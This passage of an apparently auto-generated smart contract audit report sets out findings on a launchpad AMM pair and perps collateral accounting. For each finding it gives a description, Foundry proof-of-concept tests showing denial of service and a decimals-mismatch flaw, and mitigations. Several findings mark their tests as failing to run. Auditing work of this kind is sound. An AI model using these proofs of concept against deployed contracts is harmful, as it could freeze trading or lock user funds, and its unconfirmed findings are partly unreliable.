6) Call pair.swap(0, smallAmountOut, someReceiver, "") so amount0In > 0 and launchpad fees > 0 are computed. In _update, _distributeLaunchpadFees calls Distributor.addRewards which reverts, causing the swap to revert and demonstrating the DoS.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract TestERC20 {
    string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply;
    mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; totalSupply += amt; emit Transfer(address(0), to, amt); }
    function transfer(address to, uint256 amt) external returns (bool) { require(balanceOf[msg.sender] >= amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; emit Transfer(msg.sender,to,amt); return true; }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp]=amt; emit Approval(msg.sender,sp,amt); return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) { uint256 a=allowance[from][msg.sender]; require(balanceOf[from]>=amt && a>=amt, "tf"); if (a!=type(uint256).max) allowance[from][msg.sender]=a-amt; balanceOf[from]-=amt; balanceOf[to]+=amt; emit Transfer(from,to,amt); return true; }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract RevertingDistributor { function addRewards(address, address, uint128, uint128) external pure { revert("always revert"); } }

contract MockFactory {
    function feeTo() external view returns (address) { return address(0); }
    function createAndInit(address t0, address t1, address lp, address dist) external returns (GTELaunchpadV2Pair) {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        p.initialize(t0, t1, lp, dist);
        return p;
    }
}

contract DistributorDosTest is Test {
    TestERC20 token0; TestERC20 token1; MockFactory fac; GTELaunchpadV2Pair pair; RevertingDistributor badDist;
    address launchpadLp = address(0xAAAA);

    function setUp() public {
        token0 = new TestERC20("T0","T0");
        token1 = new TestERC20("T1","T1");
        token0.mint(address(this), 2e24); // 2e6 T0
        token1.mint(address(this), 2e24); // 2e6 T1

        fac = new MockFactory();
        badDist = new RevertingDistributor();
        pair = fac.createAndInit(address(token0), address(token1), launchpadLp, address(badDist));

        // Seed initial liquidity and mint LP to launchpadLp so fee share > 0
        token0.transfer(address(pair), 1e21); // 1,000 T0
        token1.transfer(address(pair), 1e21); // 1,000 T1
        pair.mint(launchpadLp);

        // Ensure next _update sees a new timestamp
        vm.warp(block.timestamp + 1);
    }

    function testSwapRevertsWhenDistributorReverts() public {
        // Pre-transfer input to the pair so amount0In > 0
        token0.transfer(address(pair), 1e18); // 1 T0 in

        // Request a small amount1Out to satisfy invariant
        vm.expectRevert();
        pair.swap(0, 1e12, address(this), "");
    }
}


## Suggested Mitigation
Isolate failures from the external Distributor so core AMM ops don’t brick:
- Do not delete accruedLaunchpadFee0/1 before the external call. Instead:
  1) Attempt IDistributor(distributor).addRewards(...) inside a try/catch.
  2) On success, clear accruedLaunchpadFee0/1 and emit LaunchpadFeesCollected.
  3) On failure, keep accruedLaunchpadFee0/1 intact and emit a LaunchpadFeeDistributionFailed event; swaps/mints/burns/syncs proceed without reverting.
- Alternatively, decouple distribution entirely: remove the external call from _update and provide a public harvestLaunchpadFees() callable by anyone (or a keeper). Core ops only accrue fees; the harvester handles distribution and can safely revert without affecting trading.
- Add upfront validation before enabling fee distribution: e.g., check via a view call that the rewards pool exists for one of (token0, token1) and totalShares > 0 to avoid known revert states.
- Consider a circuit-breaker: if a distribution attempt fails N times within a window, automatically disable rewardsPoolActive or stop attempting distribution until governance intervenes.


## [M-21]. Unisolated call to Distributor.addRewards in GTELaunchpadV2Pair._update can DoS swaps and liquidity ops

### Finding Severity Justification: The external call to Distributor.addRewards() inside the pair’s core _update() path is unisolated. If it reverts (e.g., NoSharesToIncentivize when totalShares == 0 or other Distributor-side conditions), all swap/mint/burn/sync calls revert, DoSing the AMM pair. This impacts protocol availability but does not directly enable theft or loss of assets, fitting a Medium severity under the rubric.
## Derived From Pattern/Invariant
Launchpad fee distribution relies on external Distributor that can brick swaps

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update / _distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Intended operational flow likely ends rewards promptly at graduation, which reduces likelihood. However, the absence of error isolation means any reverting condition in the Distributor (including configuration drift or transient zero-shares) can still DoS the pair. Given these operational assumptions, SomeWhatConfident is appropriate.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
GTELaunchpadV2Pair’s core state update function `_update` calls an external Distributor on every block where launchpad fees are due, without any error isolation. If `IDistributor.addRewards` reverts for any reason (bug, state condition such as NoSharesToIncentivize, or future upgrade), every call to `_update` that tries to distribute fees will revert, breaking swaps and other operations.

Relevant code:

```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;

    uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```

`_update` is called from `mint`, `burn`, `swap`, and `sync`, i.e. all core AMM operations. It forwards all remaining gas to the external Distributor call via `_distributeLaunchpadFees` and will revert if that call reverts.

`Distributor.addRewards` has several revert conditions, e.g.:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        ...
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
``

If a launchpad pair is configured such that its corresponding rewards pool has `totalShares == 0` (e.g. mis-sequenced initialization or a future config change where staked positions are all withdrawn while the pair still accrues fees), `addRewards` will revert with `NoSharesToIncentivize`. From that point onward, any swap/mint/burn/sync that attempts to distribute nonzero `totalLaunchpadFee*` will revert in `_update`.

Because there is no try/catch, no circuit-breaker, and no alternative accounting path, a single persistent revert condition in Distributor can permanently brick the AMM pair’s functionality, even if all parties are honest and just following the intended launchpad / staking flow. Users then cannot swap, add liquidity, or remove liquidity on that pair.

## Impact
A revert in Distributor.addRewards (e.g., RewardsDoNotExist, NoSharesToIncentivize, or token transfer/approval failures) will bubble up and revert GTELaunchpadV2Pair._update, causing all core AMM operations that reach distribution (swap/mint/burn/sync) to revert. This can indefinitely freeze swapping and trap LP liquidity on the affected pair until governance intervenes (e.g., changing the distributor, reconfiguring rewards, or disabling distribution). No funds are stolen, but availability is lost and users cannot add/remove liquidity or swap on that pair.

## Command to Run Test


## Proof of Concept
How to trigger a persistent DoS without any malicious admin:

1) A pair is initialized with a launchpadFeeDistributor.
2) The Distributor’s addRewards path becomes reverting for this pair (e.g., RewardsDoNotExist due to missing pool, NoSharesToIncentivize when totalShares == 0, or any failure inside addRewards such as a token transfer revert).
3) After initial liquidity is added, a user performs a swap in a new block that generates non-zero launchpad fees. In _update, since timeElapsed > 0 and fees > 0, the pair calls _distributeLaunchpadFees → distributor.addRewards, which reverts.
4) The revert propagates, reverting the entire swap (and similarly any mint/burn/sync that reaches distribution). Because each attempt re-enters the same failing addRewards, the pair remains bricked until governance fixes the distributor state.

Note: Accrued fees are not lost on revert (the transaction reverts entirely). The problem is persistent reverts causing a DoS, not fee loss.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract ERC20Mock {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n; symbol = s; decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt; totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt; return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        if (allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= amt, "allow");
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt; balanceOf[to] += amt; return true;
    }
}

contract RevertingDistributor {
    function addRewards(address, address, uint128, uint128) external pure {
        revert("addRewards reverted");
    }
}

contract GTELaunchpadV2Pair_DoS_Test is Test {
    GTELaunchpadV2Pair pair;
    RevertingDistributor dist;
    ERC20Mock t0; ERC20Mock t1;

    address lp = address(0xBEEF); // receives LP tokens

    function setUp() public {
        t0 = new ERC20Mock("T0","T0",18);
        t1 = new ERC20Mock("T1","T1",18);
        t0.mint(address(this), 1e30);
        t1.mint(address(this), 1e30);

        pair = new GTELaunchpadV2Pair();
        dist = new RevertingDistributor();
        // initialize with our tokens and the reverting distributor
        pair.initialize(address(t0), address(t1), lp, address(dist));

        // Seed initial liquidity so reserves > 0
        t0.transfer(address(pair), 1e24);
        t1.transfer(address(pair), 1e24);
        pair.mint(lp);

        // move forward to ensure timeElapsed > 0 on next update
        vm.warp(block.timestamp + 1);
    }

    function test_swap_reverts_when_distributor_reverts() public {
        // Provide token0 input to generate non-zero launchpad fees
        t0.transfer(address(pair), 1e21);
        // Expect revert bubbling from _distributeLaunchpadFees -> addRewards
        vm.expectRevert();
        pair.swap(0, 1e18, address(this), bytes(""));
    }
}


## Suggested Mitigation
Make the distributor interaction non-blocking and accounting-correct:

1) Wrap approvals and addRewards in try/catch and never revert core flows. If the external call fails, re-credit the full total fees back to accruedLaunchpadFee* so they can be retried later. Example pattern:

- Compute totalLaunchpadFee* as today.
- Do NOT delete accruedLaunchpadFee* until after a successful external call. Alternatively, delete then set them back on catch with exact totals.

Pseudo:

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) == 0) return;
    address _t0 = token0; address _t1 = token1; address d = launchpadFeeDistributor;
    // best-effort approvals; wrap to avoid revert blocking core flows
    try this._approveHelper(_t0, d, fee0) {} catch {}
    try this._approveHelper(_t1, d, fee1) {} catch {}
    try IDistributor(d).addRewards(_t0, _t1, uint128(fee0), uint128(fee1)) {
        emit LaunchpadFeesCollected(fee0, fee1);
    } catch {
        // re-accrue for retry; ensure exact restoration of totals
        accruedLaunchpadFee0 += fee0;
        accruedLaunchpadFee1 += fee1;
        emit LaunchpadFeesLastAccrued(fee0, fee1);
    }
}

function _approveHelper(address token, address to, uint112 amount) external {
    if (amount == 0) return;
    // For widest compatibility, reset to 0 then set amount; ignore failures
    (bool s0,) = token.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), to, 0));
    (bool s1,) = token.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), to, uint256(amount)));
    if (!s0 && !s1) revert(); // only to enable try/catch above
}

2) Alternatively, fully decouple distribution from core paths: always accumulate into accruedLaunchpadFee*, and expose a separate public function (e.g., pushFeesToDistributor()) that anyone can call. Failures in that function must not affect swaps/mints/burns; retries are allowed until it succeeds.

3) Operational safeguards: on initialize, verify the rewards pool exists and is active; add an admin function to disable launchpad distribution (set launchpadFeeDistributor to address(0)) if downstream is broken; and optionally only attempt distribution when a sticky lastFailed flag is false or after a cooldown.


## [L-22]. External Distributor.addRewards callback in _distributeLaunchpadFees can DoS swaps if misconfigured

### Finding Severity Justification: The external call to Distributor.addRewards inside core AMM flows (swap/mint/burn/sync) can revert and DoS the pair, but only when the Distributor is misconfigured (e.g., rewards pool not created or totalShares == 0). Since this depends on privileged/governance setup and privileged roles are trusted per contest rules, the impact is classified as governance risk and capped at Low.
## Derived From Pattern/Invariant
Launchpad fee distribution relies on external Distributor that can brick swaps

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._distributeLaunchpadFees (indirectly via swap/mint/burn/sync)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The AMM pair calls an external Distributor on every distribution of launchpad fees without isolation or error handling. Any revert in that external call will revert the entire `_update` and thus brick core operations such as `swap`, `mint`, `burn`, and `sync` for the pair.

Relevant code:

```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```

`_update` is invoked from:

* `mint`
* `burn`
* `swap`
* `sync`

so any revert in `_distributeLaunchpadFees` will revert those functions as well.

`Distributor.addRewards` has several revert paths:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

Even assuming the Distributor contract itself is trusted, it is easy for governance/admins to end up in a state where `addRewards` reverts during otherwise normal AMM operation:

* If no staking shares have been created yet (`totalShares == 0`) for the relevant reward pool, `addRewards` reverts with `NoSharesToIncentivize()`.
* If the wrong pair of tokens was used when creating the rewards pool or if the pool was never set up, `addRewards` reverts with `RewardsDoNotExist()`.

In such cases, any swap/mint/burn that attempts to distribute accumulated launchpad fees will now revert inside `_distributeLaunchpadFees`, making the entire pair unusable until governance corrects the Distributor state or re-deploys a new pair.

This is a classic griefable-callback / tight-coupling pattern: core AMM functionality depends on an external module behaving perfectly and never reverting. There is no `try/catch`, no gas stipend, and no fallback when `addRewards` fails.

## Impact
Any revert in Distributor.addRewards (e.g., RewardsDoNotExist or NoSharesToIncentivize) will bubble up through _distributeLaunchpadFees and revert _update, which bricks swap, mint, burn, and sync for the pair. This can happen if governance misconfigures the Distributor (pool not created for the token pair, or totalShares == 0). While this is a governance/privileged misconfiguration and thus limited in scope, the effect is a full DoS of the AMM pair until an admin fixes the Distributor state or disables rewards accrual.

## Command to Run Test


## Proof of Concept
To reliably demonstrate the DoS, ensure the launchpadLp address actually holds LP tokens so _getLaunchpadFees produces a non-zero amount and _distributeLaunchpadFees is called:

1) Deploy GTELaunchpadV2Pair with launchpadLp set to an address that will receive the LP tokens (e.g., the test contract address) and launchpadFeeDistributor set to a Distributor.
2) Do NOT call Distributor.createRewardsPair for the (token0, token1) combination so addRewards will revert with RewardsDoNotExist (alternatively, create the pool but keep totalShares == 0 to hit NoSharesToIncentivize).
3) Add initial liquidity to the pair so that the launchpadLp address actually holds the minted LP tokens.
4) Advance time so _update sees timeElapsed > 0.
5) Execute a swap that generates a non-zero launchpad fee (now non-zero because launchpadLp holds LP tokens). When _update runs, it will call _distributeLaunchpadFees → Distributor.addRewards and revert, which reverts the entire swap (and will similarly revert mint/burn/sync).

## Proof of Code
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock2 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
    function mint(address to, uint256 value) external {
        totalSupply += value;
        balanceOf[to] += value;
    }
}

contract LaunchpadDistributorDoSTest is Test {
    GTELaunchpadV2Pair pair;
    Distributor dist;
    ERC20Mock2 token0;
    ERC20Mock2 token1;

    function setUp() public {
        token0 = new ERC20Mock2("T0", "T0");
        token1 = new ERC20Mock2("T1", "T1");

        // Deploy pair; in constructor, factory = msg.sender (this test contract)
        pair = new GTELaunchpadV2Pair();

        // Deploy and initialize Distributor; owner = this test contract
        dist = new Distributor();
        dist.initialize(address(this));

        // Initialize pair with launchpadLp set to this test contract so it holds LP tokens
        // and with Distributor set as the fee distributor
        pair.initialize(address(token0), address(token1), address(this), address(dist));

        // Intentionally do NOT create rewards pair in distributor to trigger RewardsDoNotExist
        // dist.createRewardsPair(address(token0), address(token1)); // (left out on purpose)

        // Seed liquidity; the LP tokens will be minted to this test contract (the 'to' in mint())
        token0.mint(address(this), 1_000 ether);
        token1.mint(address(this), 1_000 ether);
        token0.transfer(address(pair), 100 ether);
        token1.transfer(address(pair), 100 ether);
        pair.mint(address(this)); // LP tokens go to address(this) == launchpadLp
    }

    function testSwapRevertsWhenDistributorMisconfigured() public {
        // Advance time so _update will try to distribute accrued fees this block
        vm.warp(block.timestamp + 10);

        // Perform a swap that pays some amount0In, accruing non-zero launchpad fees
        token0.mint(address(this), 10 ether);
        token0.transfer(address(pair), 10 ether);

        // Expect revert due to Distributor.addRewards -> RewardsDoNotExist
        vm.expectRevert(Distributor.RewardsDoNotExist.selector);
        pair.swap(0, 0.01 ether, address(this), "");
    }
}


## Suggested Mitigation
Harden the external callback and avoid tight coupling between core AMM flows and the Distributor:

- Wrap IDistributor(distributor).addRewards(...) in try/catch. On failure:
  - Do not delete accruedLaunchpadFee0/1; instead, keep accruing and emit an event (e.g., LaunchpadFeeDistributionFailed) so swaps/mints/burns/sync continue to function. Move the deletes to execute only after a successful distribution.
- Add a pre-check before attempting distribution: query the Distributor for pool existence and shares (e.g., expose getRewardsPoolData in the IDistributor interface and verify that the token pair exists and totalShares > 0). If not ready, accumulate fees on the pair and skip the external call.
- Operationally: ensure launchpad enables fee accrual only after the corresponding Distributor pool is initialized and has non-zero shares. Optionally, expose an admin function to safely disable rewards (endRewardsAccrual) if the Distributor is misconfigured.

These changes remove the ability for a misconfigured Distributor to DoS core AMM operations while preserving fee accrual until distribution becomes possible.





 **Derived From** : Perps margin and price math assume 18‑decimals while USDC collateral may be 6‑decimals

## [H-23]. USDC collateral treated as 18 decimals causes 1e12 under/overestimation of margin and liquidation thresholds

### Finding Severity Justification: Perps math is done in 1e18 wad units (prices, notionals, margins), while the collateral token (USDC) is handled and transferred in raw ERC20 units. No scaling is applied when moving value between freeCollateral (token units) and subaccount margin (wad), nor when adding/removing margin. This causes systemic unit mismatches: margin arithmetic and risk checks operate in 1e18, but debits/credits to freeCollateral are performed with the same unscaled numbers, effectively 1e12 off for a 6‑decimals token. This can lead to protocol-breaking behavior (reverts on opening positions due to InsufficientBalance, incorrect margin accounting, liquidation and bad debt paths) and potential loss or lock of user funds/insurance.
## Derived From Pattern/Invariant
Perps margin and price math assume 18‑decimals while USDC collateral may be 6‑decimals

## Exploit Type
ERC20DecimalsMismatch

## Location
MarketLib.getIntendedMargin

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Throughout the perps stack, all pricing and notional computations are done in 1e18 fixed point, but the collateral token USDC is hard-coded and its decimals are never read or normalized. Standard USDC uses 6 decimals.

Examples of 1e18-scaled math in MarketLib:

```solidity
function getUpnl(Market storage self, Position memory position) internal view returns (int256 upnl) {
    uint256 currentNotional = position.amount.fullMulDiv(self.markPrice, 1e18);
    return _calcUpnl(position.isLong, position.openNotional, currentNotional);
}

function getIntendedMargin(Market storage self, Position memory position)
    internal
    view
    returns (uint256 intendedMargin)
{
    if (position.amount == 0) return 0;
    uint256 currentNotional = position.amount.fullMulDiv(self.markPrice, 1e18);
    intendedMargin = currentNotional.fullMulDiv(1e18, position.leverage);
}

function getMinOpenMargin(Market storage self, uint256 positionAmount)
    internal
    view
    returns (uint256 minOpenMargin)
{
    uint256 positionNotional = positionAmount.fullMulDiv(self.markPrice, 1e18);
    minOpenMargin = positionNotional.fullMulDiv(1e18, StorageLib.loadMarketSettings(self.asset).maxOpenLeverage);
}
```

These values (currentNotional, intendedMargin, minOpenMargin) are intended to be in quote units with 1e18 scaling.

Collateral is managed in CollateralManagerLib with **raw USDC units**:

```solidity
address constant USDC = Constants.USDC;

struct CollateralManager {
    mapping(address account => mapping(uint256 subaccount => int256)) margin;
    mapping(address account => uint256) freeCollateral; // raw token amount
}

function depositFreeCollateral(..., uint256 amount) internal {
    USDC.safeTransferFrom(from, address(this), amount);
    self.creditAccount(to, amount);
}

function creditAccount(CollateralManager storage self, address account, uint256 amount) internal {
    self.freeCollateral[account] += amount;
}
```

Nowhere is `decimals()` queried for USDC, and no scaling is applied when comparing margin requirements to balances in ClearingHouseLib. For example, margin checks (simplified) do:

```solidity
function isOpenMarginRequirementMet(..., int256 margin) internal view returns (bool met) {
    uint256 minOpenMargin; int256 upnl;
    for (...) {
        minOpenMargin += market.getMinOpenMargin(positions[i].amount);
        upnl += market.getUpnl(positions[i]);
    }
    return margin + upnl >= minOpenMargin.toInt256();
}
```

If USDC has 6 decimals, then:

* A user deposit of 1 USDC is stored as `1e6` in `freeCollateral` and margin.
* A 1 USDC margin requirement computed as `1e18` (quote units) will be compared directly to `1e6`, i.e. the system thinks the user has **1e12 times less margin** than required.

Depending on normalization assumptions elsewhere, this can manifest as:

* Allowing users to open positions with 1 USDC real collateral when 1e12 more would be intended,
* Or conversely, liquidating users that are actually well-collateralized.

Either way, the invariants around `minOpenMargin`, maintenance margin, and funding-settled margin are **systematically off by 1e12** whenever USDC is a 6-decimal token, directly impacting solvency and liquidation behavior.

## Impact
Perps accounting mixes 1e18-wad risk/margin math with raw ERC20 (e.g., 6‑dec) token amounts without any scaling. This causes two critical effects: (1) deterministic DoS on trading and leverage updates because handleCollateralDelta debits/credits freeCollateral using 1e18-scaled deltas against 6‑dec balances (leading to InsufficientBalance reverts unless users deposit 1e12x more than intended), and (2) incorrect margin levels stored/checked (e.g., addMargin writes raw 6‑dec values into a 1e18 domain), making risk checks overly strict and enabling premature liquidations or blocking normal operations. In short, with a 6‑dec collateral token, users cannot reliably open/close or adjust positions, and liquidation logic may misfire, risking lock of funds and protocol insolvency procedures triggering incorrectly.

## Command to Run Test


## Proof of Concept
How the mismatch breaks flows:

1) Opening a position (or any path that uses positive marginDelta) debits freeCollateral by a 1e18-scaled amount using CollateralManagerLib.handleCollateralDelta, while freeCollateral is tracked in raw token units (e.g., 6‑dec). Example: a 1000 notional trade at 10x produces marginDelta ≈ 100e18. With 100e6 freeCollateral (100 USDC), debitAccount(100e18) reverts InsufficientBalance.

2) Adding margin stores the deposit as-is into `margin` (e.g., 100e6), but risk math (minOpenMargin, intendedMargin, uPnL) is in 1e18 units; comparisons like `margin + upnl >= minOpenMargin` are off by 1e12, causing excessive rejections and/or premature liquidations.

Key code sites:
- MarketLib/CLOBLib compute notional/margins in 1e18.
- CollateralManagerLib.freeCollateral is raw token units; handleCollateralDelta directly debits/credits with 1e18 numbers.
- PerpManager.addMargin passes raw `amount` directly into `settleMarginUpdate` (stored as margin) and then handleCollateralDelta uses the same unscaled number.

Net result: With a 6‑dec collateral token, position opens/updates revert or risk checks mis-evaluate by 1e12.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {StorageLib} from "../contracts/perps/types/StorageLib.sol";
import {CollateralManager, CollateralManagerLib} from "../contracts/perps/types/CollateralManager.sol";

contract DecimalsMismatchTest is Test {
    using CollateralManagerLib for CollateralManager;

    // Demonstrates the hard revert when a 1e18-scaled margin delta
    // is applied to a 6-dec freeCollateral balance (units mismatch).
    function test_settleFill_reverts_dueToUnitMismatch() public {
        CollateralManager storage cm = StorageLib.loadCollateralManager();
        address user = address(0xBEEF);

        // Simulate deposit of 100 USDC with 6 decimals (no ERC20 transfer).
        cm.creditAccount(user, 100e6);
        assertEq(cm.getFreeCollateralBalance(user), 100e6);

        // Simulate opening a position needing ~100 USDC margin but expressed in 1e18 wad units.
        // handleCollateralDelta will try to debit 100e18 from freeCollateral (100e6), causing revert.
        vm.expectRevert(CollateralManagerLib.InsufficientBalance.selector);
        cm.settleFill(user, 0, 0, int256(100e18)); // marginDelta = +100e18 (wad), margin stays 0 here
    }

    // Shows that addMargin stores raw 6-decimals into `margin`, while all risk checks are in 1e18.
    function test_addMargin_storesUnscaledMargin() public {
        CollateralManager storage cm = StorageLib.loadCollateralManager();
        address user = address(0xCAFE);

        // Free collateral: 100 USDC (6 decimals)
        cm.creditAccount(user, 100e6);
        assertEq(cm.getFreeCollateralBalance(user), 100e6);

        // Add 100 USDC margin via settleMarginUpdate with raw amount
        int256 remaining = cm.settleMarginUpdate(user, 0, int256(100e6), 0);

        // Margin stored unscaled (100e6), but risk engine expects 100e18 for 100 USDC in 1e18 wad units.
        assertEq(remaining, int256(100e6));
        // Free collateral decreased by 100e6 (token units), not 1e18
        assertEq(cm.getFreeCollateralBalance(user), 0);
    }
}


## Suggested Mitigation
Introduce consistent unit normalization between internal perps math (1e18 wad) and external ERC20 token units:

- On initialization, query the collateral token decimals once (e.g., via IERC20Metadata) and store a scale factor: `collateralScale = 10 ** (18 - decimals)` if decimals <= 18; handle >18 by inverse scaling.

- Represent all internal margins, notionals, prices in 1e18 wad, but convert whenever crossing the boundary to/from token balances:
  - In PerpManager.addMargin/removeMargin: treat user `amount` as token units, convert to 1e18 (`amountWad = amount * collateralScale`) before passing to CollateralManager.settleMarginUpdate.
  - In CollateralManagerLib.handleCollateralDelta: the `collateralDelta` parameter is in 1e18; convert to token units before touching freeCollateral (e.g., `tokenAmount = collateralDelta / collateralScale`, rounding conservatively in favor of the protocol).
  - For limit-posted collateral in CLOBLib/ClearingHouse paths: values like `_getCollateral` return 1e18 wad; convert to token units only at the debit/credit boundary (handleCollateralDelta), not earlier.

- Optionally, enforce at deployment that the configured collateral token has 18 decimals to simplify, but a robust solution must support arbitrary decimals as above.

- Add unit tests that: (a) open/close trades with 6‑dec tokens without revert, (b) verify equality of balances with the main invariant, and (c) compare risk checks before/after scaling to ensure parity.


## [H-24]. 1e18 notional vs 1e6 USDC margin comparison lets users open positions with far less real collateral than required

